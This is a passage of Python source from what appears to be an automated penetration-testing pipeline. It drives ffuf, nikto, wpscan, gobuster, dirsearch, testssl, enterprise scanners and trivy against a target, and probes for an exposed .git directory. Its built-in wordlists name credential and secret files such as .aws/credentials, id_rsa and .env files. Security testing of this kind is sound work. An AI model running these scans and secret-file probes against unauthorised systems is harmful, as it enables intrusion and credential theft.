                "/opt/homebrew/share/seclists/Discovery/Web-Content/common.txt",
                "/opt/homebrew/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
                "/opt/homebrew/share/dirb/wordlists/common.txt",
                "/opt/homebrew/Cellar/dirb/2.22/share/dirb/wordlists/common.txt",
                # macOS Homebrew (Intel)
                "/usr/local/share/seclists/Discovery/Web-Content/common.txt",
                "/usr/local/share/dirb/wordlists/common.txt",
                "/usr/local/Cellar/dirb/2.22/share/dirb/wordlists/common.txt",
                # Linux standard paths
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/dirb/wordlists/common.txt",
                "/usr/share/seclists/Discovery/Web-Content/common.txt",
                "/opt/SecLists/Discovery/Web-Content/common.txt",
                "/usr/local/share/wordlists/dirb/common.txt",
                # User-local paths
                "~/.local/share/wordlists/common.txt",
                "~/.local/share/seclists/Discovery/Web-Content/common.txt",
            ]

            wordlist = None
            for wl_path in wordlist_paths:
                expanded_path = os.path.expanduser(wl_path)
                if os.path.exists(expanded_path):
                    wordlist = expanded_path
                    break

            # Fallback: Create minimal built-in wordlist if none found
            if not wordlist:
                fallback_wordlist = self.output_dir / "wordlist_common.txt"
                fallback_words = [
                    # Common directories
                    "admin", "administrator", "api", "app", "application", "assets",
                    "backup", "backups", "bin", "cache", "cgi-bin", "config", "console",
                    "css", "dashboard", "data", "database", "db", "debug", "dev",
                    "docs", "downloads", "error", "files", "fonts", "home", "html",
                    "images", "img", "includes", "install", "js", "lib", "log", "login",
                    "logs", "mail", "media", "old", "panel", "php", "phpmyadmin",
                    "private", "public", "robots.txt", "scripts", "server", "server-status",
                    "setup", "shell", "sitemap.xml", "src", "static", "stats", "status",
                    "storage", "system", "temp", "test", "tmp", "upload", "uploads",
                    "user", "users", "var", "vendor", "web", "webmail", "wp-admin",
                    "wp-content", "wp-includes", "wp-login.php", "xmlrpc.php",
                    # Sensitive environment/config files
                    ".env", ".env.local", ".env.dev", ".env.prod", ".env.production",
                    ".env.staging", ".env.backup", ".env.example", ".env.sample", ".env.old",
                    ".env.bak", ".env.swp", ".env~", "env.js", "env.json",
                    # Git/SVN/Version control
                    ".git", ".git/config", ".git/HEAD", ".gitignore", ".gitattributes",
                    ".svn", ".svn/entries", ".hg", ".bzr",
                    # Swagger/OpenAPI/API docs
                    "swagger", "swagger.json", "swagger.yaml", "swagger.yml",
                    "swagger-ui", "swagger-ui.html", "swagger-resources",
                    "api-docs", "api-docs.json", "openapi.json", "openapi.yaml",
                    "v1/swagger.json", "v2/swagger.json", "v3/swagger.json",
                    "api/swagger.json", "api/v1/swagger.json", "api/v2/swagger.json",
                    "docs/api", "api/docs", "redoc", "graphql", "graphiql",
                    # Config files
                    ".htaccess", ".htpasswd", "web.config", "config.php", "config.js",
                    "config.json", "config.yaml", "config.yml", "settings.py",
                    "settings.json", "application.yml", "application.properties",
                    "appsettings.json", "appsettings.Development.json",
                    # Backup files
                    "backup.sql", "backup.zip", "backup.tar.gz", "backup.tar",
                    "database.sql", "db.sql", "dump.sql", "data.sql",
                    "site.zip", "www.zip", "html.zip", "public.zip",
                    "backup", "bak", "old", "archive",
                    # Package managers
                    "composer.json", "composer.lock", "package.json", "package-lock.json",
                    "yarn.lock", "Gemfile", "Gemfile.lock", "requirements.txt",
                    "Pipfile", "Pipfile.lock", "pom.xml", "build.gradle",
                    # Debug/Info pages
                    "phpinfo.php", "info.php", "test.php", "debug.php",
                    "server-info", "server-status", "debug", "trace",
                    "actuator", "actuator/health", "actuator/env", "actuator/info",
                    "metrics", "health", "healthcheck", "health-check",
                    # Admin panels
                    "admin", "administrator", "admin.php", "admin.html",
                    "wp-admin", "wp-login.php", "cpanel", "plesk",
                    "manager", "console", "portal", "backend",
                    # Logs
                    "debug.log", "error.log", "access.log", "app.log",
                    "laravel.log", "storage/logs", "logs", "log",
                    # AWS/Cloud
                    ".aws", ".aws/credentials", "aws.yml", "s3.yml",
                    # Docker/K8s
                    "docker-compose.yml", "docker-compose.yaml", "Dockerfile",
                    ".dockerenv", "kubernetes.yml", "k8s.yml",
                    # CI/CD
                    ".travis.yml", ".gitlab-ci.yml", "Jenkinsfile",
                    ".circleci/config.yml", ".github/workflows",
                    # Misc sensitive
                    "crossdomain.xml", "clientaccesspolicy.xml",
                    ".DS_Store", "Thumbs.db", ".idea", ".vscode",
                    "id_rsa", "id_rsa.pub", ".ssh", "known_hosts",
                    "readme.html", "readme.md", "readme.txt", "CHANGELOG.md",
                    "LICENSE", "VERSION", "INSTALL", "TODO",
                ]
                fallback_wordlist.write_text("\n".join(fallback_words))
                wordlist = str(fallback_wordlist)
                logger.debug(f"Using built-in fallback wordlist: {wordlist}")

            if wordlist:
                ffuf_output_file = self.output_dir / f"ffuf_{self.domain}.json"
                ffuf_txt_file = self.output_dir / f"ffuf_{self.domain}.txt"

                # Use JSON output for reliable parsing
                ret, output = await self._run_command(
                    f"ffuf -u {self.target}/FUZZ -w {wordlist} -mc 200,301,302,403 -t 50 -o {ffuf_output_file} -of json 2>&1",
                    timeout=300
                )
                tool_elapsed = time.time() - tool_start

                found_paths = []

                # Parse JSON output if available
                if ffuf_output_file.exists():
                    try:
                        ffuf_data = json.loads(ffuf_output_file.read_text())
                        results = ffuf_data.get("results", [])
                        for result in results:
                            url = result.get("url", "")
                            if url:
                                # Extract path from URL
                                path = url.replace(self.target, "").strip("/")
                                if path:
                                    found_paths.append(path)
                    except (json.JSONDecodeError, KeyError) as e:
                        logger.debug(f"Failed to parse ffuf JSON: {e}")

                # Write text output
                if found_paths:
                    ffuf_txt_file.write_text("\n".join(found_paths))
                    tools_run.append("ffuf")

                    # Add interesting paths as findings
                    interesting_patterns = ["admin", "backup", "config", "db", "database", "api", "upload", "shell", "test"]
                    for path in found_paths[:50]:  # Limit to first 50
                        is_interesting = any(p in path.lower() for p in interesting_patterns)
                        if is_interesting:
                            findings.append(Finding(
                                type="directory_discovery",
                                value=path,
                                description=f"Potentially sensitive directory discovered: {path}",
                                severity="low",
                                phase="scan",
                                tool="ffuf",
                                target=self.target
                            ))

                    # Save ffuf structured findings JSON
                    ffuf_findings_list = [f for f in findings if f.tool == "ffuf"]
                    ffuf_findings_json_path = self.output_dir / f"ffuf_{self.domain}_findings.json"
                    ffuf_findings_data = {
                        "target": self.target,
                        "domain": self.domain,
                        "scan_type": "ffuf",
                        "status": "completed",
                        "path_count": len(found_paths),
                        "finding_count": len(ffuf_findings_list),
                        "findings": [
                            {
                                "type": f.type,
                                "value": f.value,
                                "description": f.description,
                                "severity": f.severity,
                                "tool": f.tool,
                                "target": f.target
                            }
                            for f in ffuf_findings_list
                        ]
                    }
                    ffuf_findings_json_path.write_text(json.dumps(ffuf_findings_data, indent=2))

                    self._log_tool(f"ffuf - {len(found_paths)} paths", "done", tool_elapsed)
                else:
                    # Save empty findings JSON
                    ffuf_findings_json_path = self.output_dir / f"ffuf_{self.domain}_findings.json"
                    ffuf_findings_data = {
                        "target": self.target,
                        "domain": self.domain,
                        "scan_type": "ffuf",
                        "status": "no_paths",
                        "path_count": 0,
                        "finding_count": 0,
                        "findings": []
                    }
                    ffuf_findings_json_path.write_text(json.dumps(ffuf_findings_data, indent=2))
                    ffuf_txt_file.write_text("")
                    self._log_tool("ffuf - no paths found", "done", tool_elapsed)
            else:
                self._log_tool("ffuf - no wordlist found", "skip")

        # 4. Nikto - Web Server Vulnerability Scanner (NEW)
        if "nikto" in self.config.scan_tools:
            self._log_tool("nikto", "running")
            tool_start = time.time()
            nikto_output_file = self.output_dir / f"nikto_{self.domain}.txt"
            ret, output = await self._run_command(
                f"nikto -h {self.target} -Format txt -output {nikto_output_file} -Tuning 123bde 2>/dev/null",
                timeout=600
            )
            tool_elapsed = time.time() - tool_start

            # Nikto may return non-zero even with valid findings - check for output file
            nikto_output = ""
            if nikto_output_file.exists():
                nikto_output = nikto_output_file.read_text()

            if nikto_output.strip():
                tools_run.append("nikto")

                # Security header patterns to detect
                header_findings = {
                    "x-frame-options": ("medium", "Missing X-Frame-Options header - Clickjacking possible", "missing_header"),
                    "strict-transport-security": ("medium", "Missing HSTS header - Downgrade attacks possible", "missing_header"),
                    "x-content-type-options": ("low", "Missing X-Content-Type-Options - MIME sniffing possible", "missing_header"),
                    "breach": ("low", "Potential BREACH vulnerability - HTTP compression on HTTPS", "potential_vulnerability"),
                    "access-control-allow-origin": ("medium", "Overly permissive CORS policy detected", "cors_misconfiguration"),
                    "server leaks inodes": ("low", "Server information disclosure via headers", "information_disclosure"),
                    "x-powered-by": ("info", "Server technology disclosed via X-Powered-By header", "information_disclosure"),
                    "retrieved x-powered-by": ("info", "Server technology disclosed via X-Powered-By header", "information_disclosure"),
                    "uncommon header": ("info", "Uncommon HTTP header detected", "information_disclosure"),
                    "retrieved access-control": ("medium", "CORS headers present - overly permissive (*)", "cors_misconfiguration"),
                    "cookie": ("medium", "Cookie security issue detected", "insecure_cookie"),
                    "without the secure flag": ("medium", "Cookie without secure flag - transmitted over HTTP", "insecure_cookie"),
                    "without the httponly flag": ("medium", "Cookie without httponly flag - accessible via JavaScript", "insecure_cookie"),
                }

                # Vulnerability patterns
                vuln_patterns = ["osvdb", "vulnerability", "outdated", "cve-", "backdoor", "remote code", "injection"]

                # Parse nikto findings
                for line in nikto_output.split("\n"):
                    line_lower = line.lower()
                    if "+ " not in line:
                        continue

                    matched = False

                    # Check for vulnerability patterns first (higher priority)
                    for vuln_pattern in vuln_patterns:
                        if vuln_pattern in line_lower:
                            severity = "medium"
                            if "critical" in line_lower or "remote" in line_lower or "backdoor" in line_lower:
                                severity = "high"
                            elif "cve-" in line_lower:
                                severity = "high"
                            findings.append(Finding(
                                type="web_vulnerability",
                                value=line.strip()[:200],
                                description=line.strip()[:500],
                                severity=severity,
                                phase="scan",
                                tool="nikto",
                                target=self.target
                            ))
                            matched = True
                            break

                    # Check for header/info patterns if no vuln matched
                    if not matched:
                        for pattern, (severity, description, finding_type) in header_findings.items():
                            if pattern in line_lower:
                                findings.append(Finding(
                                    type=finding_type,
                                    value=pattern.replace("-", " ").title(),
                                    description=f"{description}. Details: {line.strip()[:200]}",
                                    severity=severity,
                                    phase="scan",
                                    tool="nikto",
                                    target=self.target
                                ))
                                matched = True
                                break

                nikto_findings_list = [f for f in findings if f.tool == "nikto"]
                nikto_findings_count = len(nikto_findings_list)

                # Save nikto JSON with structured findings
                nikto_json_path = self.output_dir / f"nikto_{self.domain}.json"
                nikto_json_data = {
                    "target": self.target,
                    "domain": self.domain,
                    "scan_type": "nikto",
                    "status": "completed",
                    "finding_count": nikto_findings_count,
                    "findings": [
                        {
                            "type": f.type,
                            "value": f.value,
                            "description": f.description,
                            "severity": f.severity,
                            "tool": f.tool,
                            "target": f.target
                        }
                        for f in nikto_findings_list
                    ]
                }
                nikto_json_path.write_text(json.dumps(nikto_json_data, indent=2))

                self._log_tool(f"nikto - {nikto_findings_count} findings", "done", tool_elapsed)
            else:
                # Analyze why nikto failed - common with CDN/WAF protected targets
                error_msg = "No output generated"
                status = "no_output"

                # Check the command output for error clues
                if output:
                    output_lower = output.lower()
                    if "error limit" in output_lower or "20 error" in output_lower:
                        error_msg = "Rate limited - target likely behind CDN/WAF (error limit reached)"
                        status = "rate_limited"
                    elif "ssl connect failed" in output_lower or "ssl" in output_lower:
                        error_msg = "SSL connection failed - target may be blocking automated scans"
                        status = "ssl_failed"
                    elif "connection refused" in output_lower:
                        error_msg = "Connection refused - target may be blocking scanner IP"
                        status = "blocked"
                    elif "timeout" in output_lower:
                        error_msg = "Connection timeout - slow response or being throttled"
                        status = "timeout"
                    else:
                        error_msg = f"Scan failed: {output[:200]}"
                        status = "failed"

                # Save error JSON for failed scan
                nikto_json_path = self.output_dir / f"nikto_{self.domain}.json"
                nikto_json_data = {
                    "target": self.target,
                    "domain": self.domain,
                    "scan_type": "nikto",
                    "status": status,
                    "error": error_msg,
                    "finding_count": 0,
                    "findings": [],
                    "note": "Target may be behind Cloudflare or other CDN/WAF. Consider authenticated scanning or manual testing."
                }
                nikto_json_path.write_text(json.dumps(nikto_json_data, indent=2))
                errors.append(f"nikto: {error_msg}")
                self._log_tool(f"nikto - {error_msg}", "error", tool_elapsed)

        # 5. WPScan - WordPress Vulnerability Scanner (NEW)
        if "wpscan" in self.config.scan_tools:
            self._log_tool("wpscan", "running")
            # Check if WordPress
            ret, check_output = await self._run_command(
                f"curl -sL {self.target}/wp-login.php --connect-timeout 5 | head -1"
            )
            if "wp-" in check_output.lower() or "wordpress" in check_output.lower():
                wpscan_token = os.getenv("WPSCAN_API_TOKEN", "")
                token_flag = f"--api-token {wpscan_token}" if wpscan_token else ""
                ret, output = await self._run_command(
                    f"wpscan --url {self.target} {token_flag} --enumerate vp,vt,u --format json --output {self.output_dir}/wpscan_{self.domain}.json 2>/dev/null",
                    timeout=600
                )
                if ret == 0:
                    tools_run.append("wpscan")
                    # Parse JSON output
                    try:
                        wpscan_file = self.output_dir / f"wpscan_{self.domain}.json"
                        if wpscan_file.exists():
                            wpscan_data = json.loads(wpscan_file.read_text())
                            vulns = wpscan_data.get("vulnerabilities", [])
                            for vuln in vulns:
                                findings.append(Finding(
                                    type="wordpress_vulnerability",
                                    value=vuln.get("title", "Unknown"),
                                    description=vuln.get("description", vuln.get("title", "")),
                                    severity=self._map_wpscan_severity(vuln.get("severity", "medium")),
                                    phase="scan",
                                    tool="wpscan",
                                    target=self.target,
                                    metadata={"cve": vuln.get("cve", [])}
                                ))
                    except (json.JSONDecodeError, FileNotFoundError):
                        pass
                    self._log_tool(f"wpscan - WordPress detected", "done")
            else:
                self._log_tool("wpscan - Not WordPress, skipped", "done")

        # 6. testssl.sh - Comprehensive SSL/TLS Testing (NEW)
        if "testssl" in self.config.scan_tools:
            self._log_tool("testssl", "running")
            ret, output = await self._run_command(
                f"testssl --jsonfile {self.output_dir}/testssl_{self.domain}.json --severity LOW {self.safe_domain} 2>/dev/null",
                timeout=300
            )
            if ret == 0:
                (self.output_dir / f"testssl_{self.domain}.txt").write_text(output)
                tools_run.append("testssl")
                # Parse for critical SSL issues
                ssl_issues = []
                for line in output.split("\n"):
                    if "VULNERABLE" in line or "NOT ok" in line:
                        ssl_issues.append(line.strip())
                        severity = "high" if "VULNERABLE" in line else "medium"
                        findings.append(Finding(
                            type="ssl_vulnerability",
                            value=line.strip()[:100],
                            description=line.strip(),
                            severity=severity,
                            phase="scan",
                            tool="testssl",
                            target=self.domain
                        ))
                # Save testssl structured findings JSON
                testssl_findings_list = [f for f in findings if f.tool == "testssl"]
                testssl_struct_json_path = self.output_dir / f"testssl_{self.domain}_findings.json"
                testssl_struct_data = {
                    "target": self.target,
                    "domain": self.domain,
                    "scan_type": "testssl",
                    "status": "completed",
                    "finding_count": len(testssl_findings_list),
                    "findings": [
                        {
                            "type": f.type,
                            "value": f.value,
                            "description": f.description,
                            "severity": f.severity,
                            "tool": f.tool,
                            "target": f.target
                        }
                        for f in testssl_findings_list
                    ]
                }
                testssl_struct_json_path.write_text(json.dumps(testssl_struct_data, indent=2))

                self._log_tool(f"testssl - {len(ssl_issues)} issues", "done")

        # 7. Gobuster - Directory/Vhost Enumeration (NEW)
        if "gobuster" in self.config.scan_tools:
            self._log_tool("gobuster", "running")
            tool_start = time.time()

            # Try multiple wordlist locations (macOS Homebrew, Linux, SecLists)
            wordlist_paths = [
                # macOS Homebrew (Apple Silicon M1/M2/M3)
                "/opt/homebrew/share/seclists/Discovery/Web-Content/common.txt",
                "/opt/homebrew/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
                "/opt/homebrew/share/dirb/wordlists/common.txt",
                "/opt/homebrew/Cellar/dirb/2.22/share/dirb/wordlists/common.txt",
                # macOS Homebrew (Intel)
                "/usr/local/share/seclists/Discovery/Web-Content/common.txt",
                "/usr/local/share/dirb/wordlists/common.txt",
                "/usr/local/Cellar/dirb/2.22/share/dirb/wordlists/common.txt",
                # Linux standard paths
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/dirb/wordlists/common.txt",
                "/usr/share/seclists/Discovery/Web-Content/common.txt",
                "/opt/SecLists/Discovery/Web-Content/common.txt",
                "/usr/local/share/wordlists/dirb/common.txt",
                # User-local paths
                "~/.local/share/wordlists/common.txt",
                "~/.local/share/seclists/Discovery/Web-Content/common.txt",
            ]

            wordlist = None
            for wl_path in wordlist_paths:
                expanded_path = os.path.expanduser(wl_path)
                if os.path.exists(expanded_path):
                    wordlist = expanded_path
                    break

            # Fallback: Use/create minimal built-in wordlist if none found
            if not wordlist:
                fallback_wordlist = self.output_dir / "wordlist_common.txt"
                if not fallback_wordlist.exists():
                    fallback_words = [
                        # Common directories
                        "admin", "administrator", "api", "app", "application", "assets",
                        "backup", "backups", "bin", "cache", "cgi-bin", "config", "console",
                        "css", "dashboard", "data", "database", "db", "debug", "dev",
                        "docs", "downloads", "error", "files", "fonts", "home", "html",
                        "images", "img", "includes", "install", "js", "lib", "log", "login",
                        "logs", "mail", "media", "old", "panel", "php", "phpmyadmin",
                        "private", "public", "robots.txt", "scripts", "server", "server-status",
                        "setup", "shell", "sitemap.xml", "src", "static", "stats", "status",
                        "storage", "system", "temp", "test", "tmp", "upload", "uploads",
                        "user", "users", "var", "vendor", "web", "webmail", "wp-admin",
                        "wp-content", "wp-includes", "wp-login.php", "xmlrpc.php",
                        # Sensitive environment/config files
                        ".env", ".env.local", ".env.dev", ".env.prod", ".env.production",
                        ".env.staging", ".env.backup", ".env.example", ".env.sample", ".env.old",
                        # Swagger/OpenAPI/API docs
                        "swagger", "swagger.json", "swagger.yaml", "swagger.yml",
                        "swagger-ui", "swagger-ui.html", "swagger-resources",
                        "api-docs", "api-docs.json", "openapi.json", "openapi.yaml",
                        "v1/swagger.json", "v2/swagger.json", "api/swagger.json",
                        "docs/api", "api/docs", "redoc", "graphql", "graphiql",
                        # Git/Version control
                        ".git", ".git/config", ".git/HEAD", ".gitignore", ".svn", ".hg",
                        # Config files
                        ".htaccess", ".htpasswd", "web.config", "config.php", "config.js",
                        "config.json", "config.yaml", "settings.py", "application.yml",
                        "appsettings.json",
                        # Backup files
                        "backup.sql", "backup.zip", "database.sql", "db.sql", "dump.sql",
                        "site.zip", "www.zip",
                        # Package managers
                        "composer.json", "composer.lock", "package.json", "package-lock.json",
                        "requirements.txt", "Pipfile", "pom.xml",
                        # Debug/Info pages
                        "phpinfo.php", "info.php", "test.php", "debug.php",
                        "server-info", "server-status", "actuator", "actuator/health",
                        "actuator/env", "metrics", "health", "healthcheck",
                        # Logs
                        "debug.log", "error.log", "access.log", "app.log", "laravel.log",
                        # Docker/CI
                        "docker-compose.yml", "Dockerfile", ".dockerenv",
                        ".travis.yml", ".gitlab-ci.yml", "Jenkinsfile",
                        # Misc sensitive
                        "crossdomain.xml", ".DS_Store", "readme.html", "readme.md",
                    ]
                    fallback_wordlist.write_text("\n".join(fallback_words))
                wordlist = str(fallback_wordlist)
                logger.debug(f"Using built-in fallback wordlist: {wordlist}")

            if wordlist:
                gobuster_output_file = self.output_dir / f"gobuster_{self.domain}.txt"

                # Use output file for reliable results
                ret, output = await self._run_command(
                    f"gobuster dir -u {self.target} -w {wordlist} -q -t 20 --no-error --no-color -o {gobuster_output_file} 2>&1",
                    timeout=300
                )
                tool_elapsed = time.time() - tool_start

                # Read from output file
                gobuster_output = ""
                if gobuster_output_file.exists():
                    gobuster_output = gobuster_output_file.read_text()

                if gobuster_output.strip():
                    tools_run.append("gobuster")

                    # Parse discovered paths
                    path_count = 0
                    for line in gobuster_output.split("\n"):
                        if line.strip() and ("Status:" in line or "(Status:" in line or "/" in line):
                            path_count += 1
                            # Check for interesting paths
                            if any(p in line.lower() for p in ["admin", "backup", "config", "api", "debug", ".git", "upload", "shell", "test"]):
                                findings.append(Finding(
                                    type="interesting_path",
                                    value=line.strip()[:200],
                                    description=f"Potentially sensitive path discovered: {line.strip()[:100]}",
                                    severity="low",
                                    phase="scan",
                                    tool="gobuster",
                                    target=self.target
                                ))
                    # Save gobuster JSON with findings
                    gobuster_findings_list = [f for f in findings if f.tool == "gobuster"]
                    gobuster_json_path = self.output_dir / f"gobuster_{self.domain}.json"
                    gobuster_json_data = {
                        "target": self.target,
                        "domain": self.domain,
                        "scan_type": "gobuster",
                        "status": "completed",
                        "path_count": path_count,
                        "finding_count": len(gobuster_findings_list),
                        "findings": [
                            {
                                "type": f.type,
                                "value": f.value,
                                "description": f.description,
                                "severity": f.severity,
                                "tool": f.tool,
                                "target": f.target
                            }
                            for f in gobuster_findings_list
                        ]
                    }
                    gobuster_json_path.write_text(json.dumps(gobuster_json_data, indent=2))

                    self._log_tool(f"gobuster - {path_count} paths", "done", tool_elapsed)
                else:
                    # Save empty JSON for no paths
                    gobuster_json_path = self.output_dir / f"gobuster_{self.domain}.json"
                    gobuster_json_data = {
                        "target": self.target,
                        "domain": self.domain,
                        "scan_type": "gobuster",
                        "status": "no_paths",
                        "path_count": 0,
                        "finding_count": 0,
                        "findings": []
                    }
                    gobuster_json_path.write_text(json.dumps(gobuster_json_data, indent=2))
                    gobuster_output_file.write_text("")
                    self._log_tool("gobuster - no paths found", "done", tool_elapsed)
            else:
                self._log_tool("gobuster - no wordlist found", "skip")

        # 8. Dirsearch - Advanced Directory Discovery (NEW)
        if "dirsearch" in self.config.scan_tools:
            self._log_tool("dirsearch", "running")
            tool_start = time.time()
            dirsearch_txt_file = self.output_dir / f"dirsearch_{self.domain}.txt"
            ret, output = await self._run_command(
                f"dirsearch -u {self.target} -e php,asp,aspx,jsp,html,js -t 20 --format plain -o {dirsearch_txt_file} 2>/dev/null",
                timeout=300
            )
            tool_elapsed = time.time() - tool_start

            if ret == 0:
                tools_run.append("dirsearch")

                # Parse dirsearch output and create JSON
                dirsearch_paths = []
                if dirsearch_txt_file.exists():
                    dirsearch_output = dirsearch_txt_file.read_text()
                    for line in dirsearch_output.split("\n"):
                        line = line.strip()
                        if line and not line.startswith("#") and not line.startswith("Target"):
                            dirsearch_paths.append(line)

                            # Check for interesting paths and add as findings
                            if any(p in line.lower() for p in ["admin", "backup", "config", "api", "debug", ".git", "upload", "shell", "test"]):
                                findings.append(Finding(
                                    type="interesting_path",
                                    value=line[:200],
                                    description=f"Potentially sensitive path discovered: {line[:100]}",
                                    severity="low",
                                    phase="scan",
                                    tool="dirsearch",
                                    target=self.target
                                ))

                # Save dirsearch JSON
                dirsearch_findings_list = [f for f in findings if f.tool == "dirsearch"]
                dirsearch_json_path = self.output_dir / f"dirsearch_{self.domain}.json"
                dirsearch_json_data = {
                    "target": self.target,
                    "domain": self.domain,
                    "scan_type": "dirsearch",
                    "status": "completed",
                    "path_count": len(dirsearch_paths),
                    "finding_count": len(dirsearch_findings_list),
                    "findings": [
                        {
                            "type": f.type,
                            "value": f.value,
                            "description": f.description,
                            "severity": f.severity,
                            "tool": f.tool,
                            "target": f.target
                        }
                        for f in dirsearch_findings_list
                    ]
                }
                dirsearch_json_path.write_text(json.dumps(dirsearch_json_data, indent=2))

                self._log_tool(f"dirsearch - {len(dirsearch_paths)} paths", "done", tool_elapsed)

        # 9. Acunetix DAST Scan (Enterprise)
        if self.config.use_acunetix:
            self._log_tool("Acunetix DAST", "running")
            try:
                acunetix = get_acunetix()
                if acunetix.connect():
                    # Start scan
                    profile_map = {
                        "full": ScanProfile.FULL_SCAN,
                        "high_risk": ScanProfile.HIGH_RISK,
                        "xss": ScanProfile.XSS_SCAN,
                        "sqli": ScanProfile.SQL_INJECTION,
                    }
                    profile = profile_map.get(self.config.acunetix_profile, ScanProfile.FULL_SCAN)

                    scan_id = acunetix.scan_url(self.target, profile, f"AIPT Scan - {self.timestamp}")
                    self.scan_ids["acunetix"] = scan_id

                    # Save scan info
                    scan_info = {
                        "scan_id": scan_id,
                        "target": self.target,
                        "profile": self.config.acunetix_profile,
                        "started_at": datetime.now(timezone.utc).isoformat(),
                        "dashboard_url": f"{acunetix.config.base_url}/#/scans/{scan_id}"
                    }
                    (self.output_dir / "acunetix_scan.json").write_text(json.dumps(scan_info, indent=2), encoding="utf-8")

                    tools_run.append("acunetix")
                    self._log_tool(f"Acunetix - Scan started: {scan_id[:8]}... (results collected at end)", "done")
                    # NOTE: Don't wait here - continue with other tools
                    # Results will be collected in the final scanner collection phase
                else:
                    errors.append("Acunetix connection failed")
                    self._log_tool("Acunetix - Connection failed", "error")
            except Exception as e:
                errors.append(f"Acunetix error: {str(e)}")
                self._log_tool(f"Acunetix - Error: {str(e)}", "error")

        # 5. Burp Suite Scan (Enterprise)
        if self.config.use_burp:
            self._log_tool("Burp Suite", "running")
            try:
                burp = get_burp()
                if burp.connect():
                    scan_id = burp.scan_url(self.target)
                    self.scan_ids["burp"] = scan_id
                    tools_run.append("burp")
                    self._log_tool(f"Burp Suite - Scan started: {scan_id}", "done")
                else:
                    errors.append("Burp Suite connection failed")
            except Exception as e:
                errors.append(f"Burp Suite error: {str(e)}")

        # 6. Nessus Vulnerability Scan (Enterprise)
        if self.config.use_nessus:
            self._log_tool("Nessus", "running")
            try:
                nessus = get_nessus()
                if nessus.connect():
                    # Extract host/IP from target URL for network scanning
                    from urllib.parse import urlparse
                    parsed = urlparse(self.target)
                    target_host = parsed.hostname or self.target

                    scan_id = nessus.scan_host(target_host, template="basic", name=f"AIPT-{self.timestamp}")
                    self.scan_ids["nessus"] = scan_id

                    # Save scan info
                    scan_info = {
                        "scan_id": scan_id,
                        "target": target_host,
                        "started_at": datetime.now(timezone.utc).isoformat(),
                    }
                    (self.output_dir / "nessus_scan.json").write_text(json.dumps(scan_info, indent=2), encoding="utf-8")

                    tools_run.append("nessus")
                    self._log_tool(f"Nessus - Scan started: {scan_id} (results collected at end)", "done")
                    # NOTE: Don't wait here - continue with other tools
                    # Results will be collected in the final scanner collection phase
                else:
                    errors.append("Nessus connection failed")
                    self._log_tool("Nessus - Connection failed", "error")
            except Exception as e:
                errors.append(f"Nessus error: {str(e)}")
                self._log_tool(f"Nessus - Error: {str(e)}", "error")

        # 7. OWASP ZAP Scan (Enterprise)
        if self.config.use_zap:
            self._log_tool("OWASP ZAP", "running")
            try:
                zap = get_zap()
                if zap.connect():
                    # Start spider + active scan
                    scan_id = zap.full_scan(self.target, spider_timeout=300)
                    self.scan_ids["zap"] = scan_id

                    # Save scan info
                    scan_info = {
                        "scan_id": scan_id,
                        "target": self.target,
                        "started_at": datetime.now(timezone.utc).isoformat(),
                    }
                    (self.output_dir / "zap_scan.json").write_text(json.dumps(scan_info, indent=2), encoding="utf-8")

                    tools_run.append("zap")
                    self._log_tool(f"OWASP ZAP - Scan started: {scan_id} (results collected at end)", "done")
                    # NOTE: Don't wait here - continue with other tools
                    # Results will be collected in the final scanner collection phase
                else:
                    errors.append("OWASP ZAP connection failed")
                    self._log_tool("OWASP ZAP - Connection failed", "error")
            except Exception as e:
                errors.append(f"OWASP ZAP error: {str(e)}")
                self._log_tool(f"OWASP ZAP - Error: {str(e)}", "error")

        # ==================== CONTAINER SECURITY (DevSecOps) ====================
        # 10. Trivy - Container/Image Vulnerability Scanner
        if self.config.enable_container_scan or self.config.full_mode:
            self._log_tool("trivy", "running")
            try:
                # Scan any discovered container images or Docker configuration
                docker_compose = self.output_dir / "docker-compose.yml"
                dockerfile = self.output_dir / "Dockerfile"

                # First, try to detect Docker presence via common paths
                ret, output = await self._run_command(
                    f"curl -sI {self.target}/docker-compose.yml --connect-timeout 5 | head -1",
                    timeout=10
                )
                has_docker = "200" in output

                # Scan web target for container-related vulnerabilities
                ret, trivy_output = await self._run_command(
                    f"trivy fs --severity {self.config.trivy_severity} --format json --output {self.output_dir}/trivy_{self.domain}.json . 2>/dev/null",
                    timeout=300
                )
                if ret == 0:
                    tools_run.append("trivy")
                    # Parse trivy JSON output
                    trivy_file = self.output_dir / f"trivy_{self.domain}.json"
                    if trivy_file.exists():
                        try:
                            trivy_data = json.loads(trivy_file.read_text())
                            for result in trivy_data.get("Results", []):
                                for vuln in result.get("Vulnerabilities", []):
                                    severity = vuln.get("Severity", "UNKNOWN").lower()
                                    findings.append(Finding(
                                        type="container_vulnerability",
                                        value=vuln.get("VulnerabilityID", "Unknown"),
                                        description=f"{vuln.get('PkgName', '')}: {vuln.get('Title', vuln.get('VulnerabilityID', ''))}",
                                        severity=severity if severity in ["critical", "high", "medium", "low"] else "medium",
                                        phase="scan",
                                        tool="trivy",
                                        target=self.target,
                                        metadata={
                                            "cve": vuln.get("VulnerabilityID"),
                                            "package": vuln.get("PkgName"),
                                            "installed_version": vuln.get("InstalledVersion"),
                                            "fixed_version": vuln.get("FixedVersion"),
                                            "cvss": vuln.get("CVSS", {})
                                        }
                                    ))
                        except (json.JSONDecodeError, FileNotFoundError):
                            pass
                    trivy_findings = len([f for f in findings if f.tool == "trivy"])
                    self._log_tool(f"trivy - {trivy_findings} vulnerabilities", "done")
                else:
                    self._log_tool("trivy - not installed or failed", "skip")
            except Exception as e:
                errors.append(f"Trivy error: {str(e)}")
                self._log_tool(f"trivy - error: {str(e)}", "error")

        # ==================== SECRET DETECTION (DevSecOps) ====================
        # 11. Gitleaks - Secret Detection in Git Repos
        if self.config.enable_secret_detection or self.config.full_mode:
            self._log_tool("gitleaks", "running")
            try:
                # Check if .git is exposed
                ret, git_check = await self._run_command(
                    f"curl -sI {self.target}/.git/config --connect-timeout 5 | head -1",
                    timeout=10
                )
                if "200" in git_check:
                    findings.append(Finding(
                        type="exposed_git",
                        value=f"{self.target}/.git/config",
                        description="Git repository exposed - potential source code and credentials leak",
                        severity="critical",
                        phase="scan",
                        tool="gitleaks",
                        target=self.target
                    ))

                # Run gitleaks on local output directory for any downloaded content
                ret, gitleaks_output = await self._run_command(
